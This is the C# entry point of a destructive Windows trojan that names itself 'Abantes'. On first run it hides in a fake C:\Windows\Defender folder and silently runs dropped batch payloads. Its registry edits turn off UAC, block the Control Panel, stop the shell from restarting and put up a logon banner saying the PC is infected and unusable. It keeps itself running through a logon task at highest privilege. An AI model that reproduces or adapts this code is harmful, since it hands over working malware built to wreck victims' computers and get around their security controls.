﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.Threading;
using System.Diagnostics;
using Abantes.Properties;
using Abantes.Payloads;
using Abantes.Utils;
using Microsoft.Win32.TaskScheduler;

namespace Abantes
{
    class Start
    {
        [STAThread]
        static void Main(string[] args)
        {
            if (Process.GetProcessesByName("Abantes").Count() > 1) { Environment.Exit(0); }
            RegistryKey editKey;
            string TempPath = Path.GetTempPath();
            string extractPath = @"C:\Windows\Defender";
            if (Registry.GetValue(@"HKEY_LOCAL_MACHINE\Software\Abantes", "AbantesWasHere", null) == null)
            {
                Directory.CreateDirectory(@"C:\Windows\Defender");
                File.WriteAllText(extractPath + "\\Action.bat", Resources.Action);
                File.WriteAllText(extractPath + "\\logonOverwrite.bat", Resources.LogonOverwrite);
                File.Copy(Application.ExecutablePath, extractPath + @"\Abantes.exe");

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("legalnoticecaption", "Important Information");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("legalnoticetext", "This Computer has been Infected by the Abantes Trojan. Now Enjoy Your Broken and Unusable PC");
                editKey.Close();
                editKey = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer");
                editKey.SetValue("NoControlPanel", "1");
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Microsoft\WindowsNT\CurrentVersion\Winlogon");
                editKey.SetValue("AutoRestartShell", "0", RegistryValueKind.DWord);
                editKey.Close();
                editKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System");
                editKey.SetValue("EnableLUA", "0", RegistryValueKind.DWord);
                editKey.Close();

                Process ScriptProcess = new Process();
                ScriptProcess.StartInfo.UseShellExecute = false;
                ScriptProcess.StartInfo.CreateNoWindow = true;
                ScriptProcess.StartInfo.FileName = extractPath + @"\Action.bat";
                ScriptProcess.Start();

                TaskService ts = new TaskService();
                TaskDefinition td = ts.NewTask();
                td.Principal.RunLevel = TaskRunLevel.Highest;
                LogonTrigger interval = new LogonTrigger();
                interval.Repetition.Interval = TimeSpan.FromMinutes(1);
                td.Triggers.Add(interval);
                td.Actions.Add(new ExecAction(Environment.GetFolderPath(Environment.SpecialFolder.Windows) + @"\Defender" + @"\Abantes.exe", null));
                ts.RootFolder.RegisterTaskDefinition("Your fate.", td);

                editKey = Registry.LocalMachine.CreateSubKey(@"Software\Abantes");
                editKey.SetValue("AbantesWasHere", "1");
                editKey.Close();
            }
            else
            {

            }
        }
    }
}
